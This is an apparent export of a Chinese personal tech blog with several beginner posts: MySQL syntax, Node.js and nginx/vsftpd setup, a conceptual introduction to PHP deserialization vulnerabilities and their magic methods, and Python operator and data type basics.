<h1 id="4-视图"><a href="#4-视图" class="headerlink" title="4.视图"></a>4.视图</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 创建视图</span><br><span class="line">CREATE VIEW v AS SELECT id, name FROM n;</span><br><span class="line">CREATE VIEW v(id, name) AS SELECT id, name FROM n;</span><br><span class="line"># 查看视图(与表操作类似)</span><br><span class="line">SELECT * FROM v;</span><br><span class="line">DESC v;</span><br><span class="line"># 查看创建视图语句</span><br><span class="line">SHOW CREATE VIEW v;</span><br><span class="line"># 更改视图</span><br><span class="line">CREATE OR REPLACE VIEW v AS SELECT name, age FROM n;</span><br><span class="line">ALTER VIEW v AS SELECT name FROM n ;</span><br><span class="line"># 删除视图</span><br><span class="line">DROP VIEW IF EXISTS v;</span><br></pre></td></tr></table></figure>
<h1 id="5-联接"><a href="#5-联接" class="headerlink" title="5.联接"></a>5.联接</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 内联接</span><br><span class="line">SELECT * FROM m INNER JOIN n ON m.id &#x3D; n.id;</span><br><span class="line"># 左外联接</span><br><span class="line">SELECT * FROM m LEFT JOIN n ON m.id &#x3D; n.id;</span><br><span class="line"># 右外联接</span><br><span class="line">SELECT * FROM m RIGHT JOIN n ON m.id &#x3D; n.id;</span><br><span class="line"># 交叉联接</span><br><span class="line">SELECT * FROM m CROSS JOIN n;   # 标准写法</span><br><span class="line">SELECT * FROM m, n;</span><br><span class="line"># 类似全连接full join的联接用法</span><br><span class="line">SELECT id,name FROM m</span><br><span class="line">UNION</span><br><span class="line">SELECT id,name FROM n;</span><br></pre></td></tr></table></figure>
<h1 id="6-用户"><a href="#6-用户" class="headerlink" title="6.用户"></a>6.用户</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"># 增加用户</span><br><span class="line">CREATE USER &#39;test&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;test&#39;;</span><br><span class="line">INSERT INTO mysql.user(Host, User, Password) VALUES (&#39;localhost&#39;, &#39;test&#39;, Password(&#39;test&#39;));    # 在用户表中插入用户信息，直接操作User表不推荐</span><br><span class="line"># 删除用户</span><br><span class="line">DROP USER &#39;test&#39;@&#39;localhost&#39;;</span><br><span class="line">DELETE FROM mysql.user WHERE User&#x3D;&#39;test&#39; AND Host&#x3D;&#39;localhost&#39;;</span><br><span class="line">FLUSH PRIVILEGES ;</span><br><span class="line"># 更改用户密码</span><br><span class="line">SET PASSWORD FOR &#39;test&#39;@&#39;localhost&#39; &#x3D; PASSWORD(&#39;test&#39;);</span><br><span class="line">UPDATE mysql.user SET Password&#x3D;Password(&#39;t&#39;) WHERE User&#x3D;&#39;test&#39; AND Host&#x3D;&#39;localhost&#39;;</span><br><span class="line">FLUSH PRIVILEGES ;</span><br><span class="line"># 用户授权</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO test@localhost IDENTIFIED BY &#39;test&#39;;</span><br><span class="line"># 授予用&#39;test&#39;密码登陆成功的test@localhost用户操作所有数据库的所有表的所有的权限</span><br><span class="line">FLUSH PRIVILEGES ;   # 刷新系统权限表,使授予权限生效</span><br><span class="line"># 撤销用户授权</span><br><span class="line">REVOKE DELETE ON *.* FROM &#39;test&#39;@&#39;localhost&#39;;   # 取消该用户的删除权限</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>mysql学习</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>nodejs安装配置</title>
    <url>/post/647e4c1a.html</url>
    <content><![CDATA[<p>　　这个是在搭建博客的时候配置nodejs的过程，记录下来<span id="more"></span></p>
<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>下载地址：<a href="https://nodejs.org/zh-cn/download/">https://nodejs.org/zh-cn/download/</a></p>
<p><img src="https://s3.ax1x.com/2020/11/20/DMwC1x.jpg" alt="DMwC1x.jpg" style="zoom:50%;" /></p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>双击打开安装文件：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/2267589-f40b21a6ccbebefa.png?imageMogr2/auto-orient/strip%7CimageView2/2" alt=""></p>
<p>安装完成之后，在dos窗口中输入”node -v“查看版本号，这里我下载的12版本</p>
<p><img src="https://s3.ax1x.com/2020/11/20/DMwPc6.jpg" alt="DMwPc6.jpg"></p>
<h1 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h1><p>1.在nodejs文件夹下创建两个文件夹：node_global和node_cache</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>新建文件夹</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>node_global</td>
<td>放安装过程中的缓存文件</td>
</tr>
<tr>
<td>node_cache</td>
<td>最终的模块配置位置</td>
</tr>
</tbody>
</table>
</div>
<p><img src="https://s3.ax1x.com/2020/11/20/DMwijK.jpg" alt="DMwijK.jpg"></p>
<p>2.创建完两个文件夹之后，打开dos窗口，输入</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">npm<span class="built_in"> config </span><span class="builtin-name">set</span><span class="built_in"> prefix </span><span class="string">&quot;D:\Drops\NODEJS\node_global&quot;</span></span><br><span class="line">npm<span class="built_in"> config </span><span class="builtin-name">set</span> cache <span class="string">&quot;D:\Drops\NODEJS\node_cache&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>注意引号之间的路径填上自己的目录路径</strong></p>
<p><img src="https://s3.ax1x.com/2020/11/20/DMwknO.jpg" alt="DMwknO.jpg"></p>
<p>3.在”系统变量下“新建”NODE_PATH“，填入D:\Drops\NODEJS\node_global\node_modules</p>
<p><img src="https://s3.ax1x.com/2020/11/20/DMw991.jpg" alt="DMw991.jpg" style="zoom:67%;" /></p>
<p>4.将用户变量下的“PATH”修改为D:\Drops\NODEJS\node_global</p>
<p><img src="https://s3.ax1x.com/2020/11/20/DMwShR.jpg" alt="DMwShR.jpg" style="zoom:67%;" /></p>
<p><img src="https://s3.ax1x.com/2020/11/20/DMdzN9.jpg" alt="DMdzN9.jpg" style="zoom:67%;" /></p>
<p><img src="https://s3.ax1x.com/2020/11/20/DMdxAJ.jpg" alt="DMdxAJ.jpg"></p>
<p>5.在dos窗口中输入node回车，再输入require(‘cluster’)出现下图，既安装成功</p>
<p><img src="https://s3.ax1x.com/2020/11/20/DMdj74.jpg" alt="DMdj74.jpg"></p>
]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>环境配置</tag>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx+vsftp搭建图片服务器</title>
    <url>/post/dd124e24.html</url>
    <content><![CDATA[<p>　　在写小程序项目的时候需要用到图片服务器，没有云服务器，只能自己搭建，linux最好是静态ip，动态ip的话，如果虚拟机的地址发生变化，访问路径也在改变，影响做项目进展。<span id="more"></span></p>
<h1 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h1><p>　　nginx是C语言开发，建议在linux上运行，本教程使用Centos 7作为安装环境。先要安装如下东西:</p>
<p><strong>1.gcc</strong></p>
<p><code>yum install gcc-c++</code></p>
<p><strong>2.pcre</strong></p>
<p><code>yum install -y pcre pcre-devel</code></p>
<p><strong>3.zlib</strong></p>
<p><code>yum install -y zlib zlib-devel</code></p>
<p><strong>4.openssl</strong></p>
<p><code>yum install -y openssl openssl-devel</code></p>
<p><strong>5.开启防火墙端口</strong></p>
<p>先把nginx和vsftp需要用到的端口先开启，以免后面出错</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">firewall-cmd <span class="attribute">--zone</span>=public <span class="attribute">--add-port</span>=80/tcp --permanent</span><br><span class="line">firewall-cmd <span class="attribute">--zone</span>=public <span class="attribute">--add-port</span>=443/tcp --permanent</span><br><span class="line">firewall-cmd <span class="attribute">--zone</span>=public <span class="attribute">--add-port</span>=22/tcp --permanent</span><br><span class="line">firewall-cmd <span class="attribute">--zone</span>=public <span class="attribute">--add-port</span>=21/tcp --permanent</span><br><span class="line">firewall-cmd <span class="attribute">--zone</span>=public <span class="attribute">--add-port</span>=30000-30999/tcp --permanent</span><br></pre></td></tr></table></figure>
<p>逐条运行以上命令就可以。</p>
<h1 id="2-安装nginx"><a href="#2-安装nginx" class="headerlink" title="2.安装nginx"></a>2.安装nginx</h1><p><strong>1.下载nginx</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget -c https:<span class="regexp">//</span>nginx.org<span class="regexp">/download/</span>nginx-<span class="number">1.8</span>.<span class="number">0</span>.tar.gz</span><br></pre></td></tr></table></figure>
<p>可以上nginx官网看一下，把版本号改成自己需要的</p>
<p><strong>2.解压</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">tar</span> -zxvf nginx-<span class="number">1</span>.<span class="number">8</span>.<span class="number">0</span>.tar.gz</span><br><span class="line"><span class="attribute">cd</span> nginx-<span class="number">1</span>.<span class="number">8</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p><strong>3.设置编译参数</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">./configure \</span><br><span class="line">--prefix=<span class="regexp">/usr/</span>local/nginx \</span><br><span class="line">--pid-path=<span class="regexp">/var/</span>run<span class="regexp">/nginx/</span>nginx.pid \</span><br><span class="line">--lock-path=<span class="regexp">/var/</span>lock/nginx.lock \</span><br><span class="line">--error-log-path=<span class="regexp">/var/</span>log<span class="regexp">/nginx/</span>error.log \</span><br><span class="line">--http-log-path=<span class="regexp">/var/</span>log<span class="regexp">/nginx/</span>access.log \</span><br><span class="line">--with-http_gzip_static_module \</span><br><span class="line">--http-client-body-temp-path=<span class="regexp">/var/</span>temp<span class="regexp">/nginx/</span>client \</span><br><span class="line">--http-proxy-temp-path=<span class="regexp">/var/</span>temp<span class="regexp">/nginx/</span>proxy \</span><br><span class="line">--http-fastcgi-temp-path=<span class="regexp">/var/</span>temp<span class="regexp">/nginx/</span>fastcgi \</span><br><span class="line">--http-uwsgi-temp-path=<span class="regexp">/var/</span>temp<span class="regexp">/nginx/u</span>wsgi \</span><br><span class="line">--http-scgi-temp-path=<span class="regexp">/var/</span>temp<span class="regexp">/nginx/</span>scgi</span><br></pre></td></tr></table></figure>
<p>直接将这段代码复制粘贴的linux中执行就可以</p>
<p><strong>4.编译</strong></p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">make</span></span><br></pre></td></tr></table></figure>
<p><strong>5.安装</strong></p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">make <span class="keyword">install</span></span><br></pre></td></tr></table></figure>
<p><strong>6.启动nginx</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cd <span class="regexp">/usr/</span>local<span class="regexp">/nginx/</span>sbin</span><br><span class="line">./nginx</span><br></pre></td></tr></table></figure>
<p>执行这个命令后是没有任何提示的，然后在浏览器中访问虚拟机的ip，出现nginx欢迎页则安装成功。</p>
<p><strong>7.关闭nginx</strong></p>
<p>关闭nginx:<br>在刚才的sbin目录下执行:</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">./nginx -s <span class="built_in">stop</span></span><br></pre></td></tr></table></figure>
<p><strong>遇到的坑</strong></p>
<p>第一次启动nginx没问题，但是如果重启虚拟机，再次到ngin的sbin目录下执行./nginx，出现以下错误</p>
<p><code>&quot;var/run/nginx/nginx.pid&quot; no such file or directory</code></p>
<p><strong>解决办法</strong></p>
<p>在linux中输入，修改nginx.conf配置文件</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vi <span class="regexp">/usr/</span>local<span class="regexp">/nginx/</span>conf/nginx.conf</span><br></pre></td></tr></table></figure>
<p>将<code>#pid    logs/nginx.pid</code>前面的#号去掉，之后<code>:wq</code>保存退出</p>
<h1 id="3-vsftp的安装"><a href="#3-vsftp的安装" class="headerlink" title="3.vsftp的安装"></a>3.vsftp的安装</h1><p><strong>1.安装</strong></p>
<p><strong>2.添加ftp用户</strong></p>
<p><strong>3.给ftp用户添加密码</strong></p>
<p>输入两次密码后修改密码</p>
<p><strong>4.修改selinux</strong></p>
<ul>
<li>查看状态</li>
</ul>
<p>执行之后可以看到</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">allow_ftpd_full_access<span class="function"> --&gt;</span> <span class="literal">off</span></span><br><span class="line">tftp_home_dir<span class="function"> --&gt;</span> <span class="literal">off</span></span><br></pre></td></tr></table></figure>
<p>两个都是off，执行下面命令设置on</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">setsebool -P ftpd_full_access <span class="keyword">on</span></span><br><span class="line">setsebool -P tftp_home_dir <span class="keyword">on</span></span><br></pre></td></tr></table></figure>
<p>再次执行<code>getsebool -a | grep ftp</code>看到那两个状态是on就行了。</p>
<p><strong>5.关闭匿名访问</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vi <span class="regexp">/etc/</span>vsftpd/vsftpd.conf</span><br></pre></td></tr></table></figure>
<p><img src="https://s3.ax1x.com/2021/01/16/sDhK3j.jpg" alt="sDhK3j.jpg"></p>
<p>还要在vsftp.conf文件最下面添加</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">pasv_min_port</span>=<span class="number">30000</span></span><br><span class="line"><span class="attr">pasv_max_port</span>=<span class="number">30999</span></span><br></pre></td></tr></table></figure>
<p><strong>6.设置开机启动</strong></p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">chkconfig vsftpd <span class="keyword">on</span></span><br></pre></td></tr></table></figure>
<h1 id="4-配置nginx为图片服务器"><a href="#4-配置nginx为图片服务器" class="headerlink" title="4.配置nginx为图片服务器"></a>4.配置nginx为图片服务器</h1><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">vi  <span class="regexp">/usr/</span>local<span class="regexp">/nginx/</span>conf/ nginx.conf</span><br></pre></td></tr></table></figure>
<p>命令，打开nginx的配置文件:</p>
<p><img src="https://s3.ax1x.com/2021/01/16/sDhMgs.jpg" alt="sDhMgs.jpg"></p>
<p>设置ftpuser文件夹可读权限，执行如下命令:</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">chmod -R <span class="number">755</span> <span class="regexp">/home/</span>ftpuser</span><br></pre></td></tr></table></figure>
<p>可以使用xftp等文件传输工具将图片传送至虚拟机</p>
<p><img src="https://s3.ax1x.com/2021/01/16/sDhO2j.jpg" alt="sDhO2j.jpg"></p>
<p><img src="https://s3.ax1x.com/2021/01/16/sDhxrq.md.jpg" alt="sDhxrq.md.jpg"></p>
]]></content>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化漏洞</title>
    <url>/post/39a24cc2.html</url>
    <content><![CDATA[<p>　　对php反序列化的基本了解，不光php存在反序列化漏洞<span id="more"></span></p>
<h1 id="1-反序列化漏洞"><a href="#1-反序列化漏洞" class="headerlink" title="1.反序列化漏洞"></a>1.反序列化漏洞</h1><p>　　在各类语言中，<strong>将对象的状态信息转换为可存储或可传输的过程就是序列化</strong>，反之就是反序列化，主要是为了方便对象的传输，通过文件、网络等方式将序列化后的字符串进行传输，最终通过反序列化可以获取之前的对象。</p>
<p>　　很多语言都存在序列化函数，如Python、Java、PHP、.NET等。在CTF中经常看到PHP反序列化的身影，原因在于PHP提供了丰富的魔术方法，加上自动加载类的使用，为构写EXP提供了便利。</p>
<h1 id="2-什么序列化和反序列化"><a href="#2-什么序列化和反序列化" class="headerlink" title="2.什么序列化和反序列化"></a>2.什么序列化和反序列化</h1><p>　　在传递变量的过程中，有可能遇到变量值要跨脚本文件传递的过程。在一个脚本文件中如果想要调用之前脚本的一个变量，但是之前一个脚本已经执行完毕，所有的变量和内容被释放掉了，如何操作？</p>
<p>　　serialize和unserialize就是为解决这个问题存在的，<strong>serialize（序列化）可以将变量转换为字符串，并且在转换的过程中可以保存当前变量的值</strong>，<strong>unserialize（反序列化）可以将serialize生成的字符串转换回变量</strong>。<!--more--></p>
<p>下面是这两种函数的简单解释：</p>
<p>序列化：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//一个类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//类的数据</span></span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">//输出数据</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">printdata</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;User &#x27;</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">&#x27; is &#x27;</span>.<span class="keyword">$this</span>-&gt;age.<span class="string">&#x27; years old.&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建一个对象</span></span><br><span class="line">$usr = <span class="keyword">new</span> User();</span><br><span class="line"><span class="comment">//设置数据</span></span><br><span class="line">$usr-&gt;age = <span class="number">18</span>;</span><br><span class="line">$usr-&gt;name = <span class="string">&#x27;vergilben&#x27;</span>;</span><br><span class="line"><span class="comment">//输出数据</span></span><br><span class="line">$usr-&gt;printdata();</span><br><span class="line"><span class="comment">//输出序列化后的数据</span></span><br><span class="line"><span class="keyword">echo</span> serialize($usr)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>结果如下</p>
<p><img src="https://s3.ax1x.com/2020/11/20/Dl9AnH.jpg" alt="Dl9AnH.jpg"></p>
<p>“O”表示对象，“4”表示对象名长度为4，“User”为序列化的对象名称，“2”表示对象中存在2个属性。</p>
<p>“{}”里面是参数的key和value</p>
<p>“s”表示字符串，“3”表示长度，“age”为是属性名称；“i”是interger对象，“18”是value</p>
<p>反序列化：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//一个类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//类的数据</span></span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">//输出数据</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">printdata</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;User &#x27;</span>.<span class="keyword">$this</span>-&gt;name.<span class="string">&#x27; is &#x27;</span>.<span class="keyword">$this</span>-&gt;age.<span class="string">&#x27; years old.&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//重建对象</span></span><br><span class="line">$usr = unserialize(<span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;i:18;s:4:&quot;name&quot;;s:9:&quot;vergilben&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="comment">//输出数据</span></span><br><span class="line">$usr-&gt;printdata();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<p><a href="https://imgchr.com/i/Dl9Fje"><img src="https://s3.ax1x.com/2020/11/20/Dl9Fje.jpg" alt="Dl9Fje.jpg"></a></p>
<p>以上可以看到被序列化的结果转换成了正常语句。</p>
<h1 id="3-PHP反序列化后的其他数据格式"><a href="#3-PHP反序列化后的其他数据格式" class="headerlink" title="3.PHP反序列化后的其他数据格式"></a>3.PHP反序列化后的其他数据格式</h1><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">类型</th>
<th>表达</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">布尔值（bool）</td>
<td>b:value —&gt; b:0</td>
</tr>
<tr>
<td style="text-align:left">整数型（int）</td>
<td>i:value —&gt; i:1</td>
</tr>
<tr>
<td style="text-align:left">字符串型（str）</td>
<td>s:length:”value”; —&gt;s:4:”aaaa”</td>
</tr>
<tr>
<td style="text-align:left">数组型（array）</td>
<td>a:\<length>:{key,value pairs}; —&gt; a:1:{i:1;s:1:”a”}</td>
</tr>
<tr>
<td style="text-align:left">对象型（object）</td>
<td>O:\<class_name_length>:</td>
</tr>
<tr>
<td style="text-align:left">NULL型</td>
<td>N</td>
</tr>
</tbody>
</table>
</div>
<h1 id="4-如何利用反序列化进行攻击"><a href="#4-如何利用反序列化进行攻击" class="headerlink" title="4.如何利用反序列化进行攻击"></a>4.如何利用反序列化进行攻击</h1><p>　　PHP中存在魔术方法，即PHP自动调用，但是存在一些调用条件，比如，__destruct是对象被销毁的时候进行调用，通常PHP在程序块执行结束时进行垃圾回收，这将进行对象销毁，然后自动触发__destruct魔术方法，如果魔术方法存在一些恶意代码，即可完成攻击。</p>
<p>常见魔术方法调用条件：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>函数名</th>
<th>何时调用</th>
</tr>
</thead>
<tbody>
<tr>
<td>__construct()</td>
<td>当一个对象创建时触发</td>
</tr>
<tr>
<td>__destruct()</td>
<td>当一个对象被销毁时触发</td>
</tr>
<tr>
<td>__toString()</td>
<td>把对象当作字符串使用时触发</td>
</tr>
<tr>
<td>__wakeup()</td>
<td>反序列化恢复对象前调用</td>
</tr>
<tr>
<td>__sleep()</td>
<td>序列化对象前调用（其返回需要是一个数组）</td>
</tr>
<tr>
<td>__get()</td>
<td>从不可访问的属性读取数据</td>
</tr>
<tr>
<td>__call()</td>
<td>在对象上下文中调用不可访问的方法时触发</td>
</tr>
<tr>
<td>__callStatic()</td>
<td>在静态上下文中调用不可访问的方法时触发</td>
</tr>
</tbody>
</table>
</div>
]]></content>
      <categories>
        <category>网络安全知识学习</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>python基础</title>
    <url>/post/81b2f4bf.html</url>
    <content><![CDATA[<p>　　基本了解Python能读懂别人的程序<span id="more"></span></p>
<h1 id="Python简介"><a href="#Python简介" class="headerlink" title="Python简介"></a>Python简介</h1><ul>
<li>解释型语言</li>
<li>交互式语言</li>
<li>面向对象语言</li>
</ul>
<h2 id="1-特点"><a href="#1-特点" class="headerlink" title="1.特点"></a>1.特点</h2><p>1.易于学习</p>
<p>2.易于阅读</p>
<p>3.易于维护</p>
<p>4.有丰富的库</p>
<p>5.可移植</p>
<p>6.可扩展</p>
<p>7.数据库</p>
<p>8.GUI编程</p>
<p>9.可嵌入</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="1-下载"><a href="#1-下载" class="headerlink" title="1.下载"></a>1.下载</h2><p>python官网：<a href="https://www.python.org/">https://www.python.org/</a></p>
<h2 id="2-安装"><a href="#2-安装" class="headerlink" title="2.安装"></a>2.安装</h2><p><img src="https://s3.ax1x.com/2020/11/12/BzyPJI.jpg" alt="BzyPJI.jpg" style="zoom:67%;" /></p>
<p><img src="https://s3.ax1x.com/2020/11/12/BzyCFA.jpg" alt="BzyCFA.jpg" style="zoom:67%;" /></p>
<p><img src="https://s3.ax1x.com/2020/11/12/Bzypod.jpg" alt="Bzypod.jpg" style="zoom:67%;" /></p>
<p>安装完成之后，打开dos命令窗口输入python，出现以下字样安装成功：</p>
<p><img src="https://s3.ax1x.com/2020/11/12/BzySdH.jpg" alt="BzySdH.jpg" style="zoom:50%;" /></p>
<h1 id="Python运算符"><a href="#Python运算符" class="headerlink" title="Python运算符"></a>Python运算符</h1><h2 id="1-算术运算符"><a href="#1-算术运算符" class="headerlink" title="1.算术运算符"></a>1.算术运算符</h2><p>与C、Java基本没有差别，多了2**6，表示2的6次方。</p>
<h2 id="2-位运算符"><a href="#2-位运算符" class="headerlink" title="2.位运算符"></a>2.位运算符</h2><p>a（60）= 0011 1100，b（13）= 0000 1101</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">运算符</th>
<th style="text-align:left">描述</th>
<th style="text-align:left">实例</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">&amp;</td>
<td style="text-align:left">按位与运算符：参与运算的两个值相应位都为1，则该位的结果为1，否则为0</td>
<td style="text-align:left">(a &amp; b) 输出结果 12 ，二进制解释： 0000 1100</td>
</tr>
<tr>
<td style="text-align:left">\</td>
<td style="text-align:left"></td>
<td style="text-align:left">按位或运算符：只要对应的两个二进位有一个为1，结果位就是1</td>
<td>(a\</td>
<td>b)输出为61，二进制解释：0011 1101</td>
</tr>
<tr>
<td style="text-align:left">^</td>
<td style="text-align:left">按位异或运算符：当两个对应的二进位相异时，结果为1</td>
<td style="text-align:left">(a ^ b) 输出结果 49 ，二进制解释： 0011 0001</td>
</tr>
<tr>
<td style="text-align:left">~</td>
<td style="text-align:left">按位取反运算符</td>
<td style="text-align:left">(~a ) 输出结果 -61 ，二进制解释： 1100 0011， 在一个有符号二进制数的补码形式。</td>
</tr>
<tr>
<td style="text-align:left">&lt;&lt;</td>
<td style="text-align:left">左移动运算符：左移动若干位</td>
<td style="text-align:left">a &lt;&lt; 2 输出结果 240 ，二进制解释： 1111 0000</td>
</tr>
<tr>
<td style="text-align:left">&gt;&gt;</td>
<td style="text-align:left">右移动运算符：右移动若干位</td>
<td style="text-align:left">a &gt;&gt; 2 输出结果 15 ，二进制解释： 0000 1111</td>
</tr>
</tbody>
</table>
</div>
<h2 id="3-逻辑运算符"><a href="#3-逻辑运算符" class="headerlink" title="3.逻辑运算符"></a>3.逻辑运算符</h2><p>a=10，b=20</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>运算符</th>
<th>逻辑表达式</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody>
<tr>
<td>and</td>
<td>x and y</td>
<td>布尔”与” - 如果 x 为 False，x and y 返回 False，否则它返回 y 的计算值。</td>
<td>(a and b) 返回 20。</td>
</tr>
<tr>
<td>or</td>
<td>x or y</td>
<td>布尔”或” - 如果 x 是 True，它返回 x 的值，否则它返回 y 的计算值。</td>
<td>(a or b) 返回 10。</td>
</tr>
<tr>
<td>not</td>
<td>not x</td>
<td>布尔”非” - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。</td>
<td>not(a and b) 返回 False</td>
</tr>
</tbody>
</table>
</div>
<h2 id="4-成员运算符"><a href="#4-成员运算符" class="headerlink" title="4.成员运算符"></a>4.成员运算符</h2><div class="table-container">
<table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody>
<tr>
<td>in</td>
<td>如果在指定的序列中找到值返回 True，否则返回 False。</td>
<td>x 在 y 序列中 , 如果 x 在 y 序列中返回 True。</td>
</tr>
<tr>
<td>not in</td>
<td>如果在指定的序列中没有找到值返回 True，否则返回 False。</td>
<td>x 不在 y 序列中 , 如果 x 不在 y 序列中返回 True。</td>
</tr>
</tbody>
</table>
</div>
<h2 id="5-身份运算符"><a href="#5-身份运算符" class="headerlink" title="5.身份运算符"></a>5.身份运算符</h2><div class="table-container">
<table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>实例</th>
</tr>
</thead>
<tbody>
<tr>
<td>is</td>
<td>is 是判断两个标识符是不是引用自一个对象</td>
<td><strong>x is y</strong>, 类似 <strong>id(x) == id(y)</strong> , 如果引用的是同一个对象则返回 True，否则返回 False</td>
</tr>
<tr>
<td>is not</td>
<td>is not 是判断两个标识符是不是引用自不同对象</td>
<td><strong>x is not y</strong> ， 类似 <strong>id(a) != id(b)</strong>。如果引用的不是同一个对象则返回结果 True，否则返回 False。</td>
</tr>
</tbody>
</table>
</div>
<p><strong>注意：is判断引用对象是否是同一个，==判断值是否相等</strong></p>
<h1 id="Python中的基本数据类型"><a href="#Python中的基本数据类型" class="headerlink" title="Python中的基本数据类型"></a>Python中的基本数据类型</h1><h2 id="1-不可变数据"><a href="#1-不可变数据" class="headerlink" title="1.不可变数据"></a>1.不可变数据</h2><h3 id="1-Number（数字）"><a href="#1-Number（数字）" class="headerlink" title="1.Number（数字）"></a>1.Number（数字）</h3><ul>
<li>int</li>
<li>float</li>
<li>bool</li>
<li>complex（复数）:a+bj或complex(a,b)表示</li>
</ul>
<h3 id="2-String（字符串）"><a href="#2-String（字符串）" class="headerlink" title="2.String（字符串）"></a>2.String（字符串）</h3><p>1.索引值正向从0开始，反向从-1开始</p>
<p><img src="https://static.runoob.com/wp-content/uploads/123456-20200923-1.svg" alt=""></p>
<p>2.str[0:5]：遵循<strong>左闭右开</strong>原则</p>
<h3 id="3-Tuple（元组）"><a href="#3-Tuple（元组）" class="headerlink" title="3.Tuple（元组）"></a>3.Tuple（元组）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tuple</span> = (<span class="string">&quot;Google&quot;</span>, <span class="string">&quot;Runoob&quot;</span>, <span class="string">&quot;Taobao&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>当元组中只有一个元素时，需要在后面加逗号，否则括号被当做运算符使用</p>
